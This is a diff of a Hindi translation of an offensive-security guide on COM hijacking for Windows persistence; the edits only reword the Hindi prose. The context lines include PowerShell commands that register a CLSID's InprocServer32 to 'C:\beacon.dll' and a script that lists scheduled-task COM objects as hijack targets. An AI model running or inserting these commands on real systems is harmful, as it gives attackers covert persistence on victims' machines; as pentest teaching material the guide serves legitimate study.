@@ -10,7 +10,7 @@
 - जहाँ _Result_ **NAME NOT FOUND** है।
 - और _Path_ **InprocServer32** पर समाप्त होता है।
 
-एक बार जब आप तय कर लें कि किस गैर-मौजूद COM का अनुकरण करना है, तो निम्नलिखित कमांड चलाएँ। _यदि आप किसी ऐसे COM का अनुकरण करने का निर्णय लेते हैं जो हर कुछ सेकंड में लोड होता है, तो सावधान रहें क्योंकि यह अधिक हो सकता है।_&#x20;
+एक बार जब आप तय कर लें कि किस गैर-मौजूद COM का अनुकरण करना है, तो निम्नलिखित कमांड चलाएँ। _यदि आप किसी ऐसे COM का अनुकरण करने का निर्णय लेते हैं जो हर कुछ सेकंड में लोड होता है, तो सावधान रहें क्योंकि यह अत्यधिक हो सकता है._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
@@ -18,7 +18,7 @@ New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F
 ```
 ### Hijackable Task Scheduler COM components
 
-Windows Tasks Custom Triggers का उपयोग COM ऑब्जेक्ट्स को कॉल करने के लिए करते हैं और चूंकि इन्हें Task Scheduler के माध्यम से निष्पादित किया जाता है, इसलिए यह अनुमान लगाना आसान होता है कि ये कब ट्रिगर होंगे।
+Windows Tasks Custom Triggers का उपयोग COM objects को कॉल करने के लिए करते हैं और चूंकि इन्हें Task Scheduler के माध्यम से निष्पादित किया जाता है, इसलिए यह अनुमान लगाना आसान होता है कि ये कब ट्रिगर होंगे।
 
 <pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -49,9 +49,9 @@ Write-Host
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [more like the previous one...]</code></pre>
 
-आउटपुट की जांच करते समय, आप एक ऐसा चयन कर सकते हैं जो **हर बार एक उपयोगकर्ता लॉग इन करता है** उदाहरण के लिए निष्पादित होने वाला है।
+आउटपुट की जांच करते समय, आप एक ऐसा चयन कर सकते हैं जो **हर बार एक उपयोगकर्ता लॉग इन करता है** उदाहरण के लिए।
 
-अब CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** को **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** और HKLM और HKCU में खोजते समय, आप आमतौर पर पाएंगे कि यह मान HKCU में मौजूद नहीं है।
+अब **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** और HKLM और HKCU में CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** की खोज करते समय, आप आमतौर पर पाएंगे कि यह मान HKCU में मौजूद नहीं है।
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
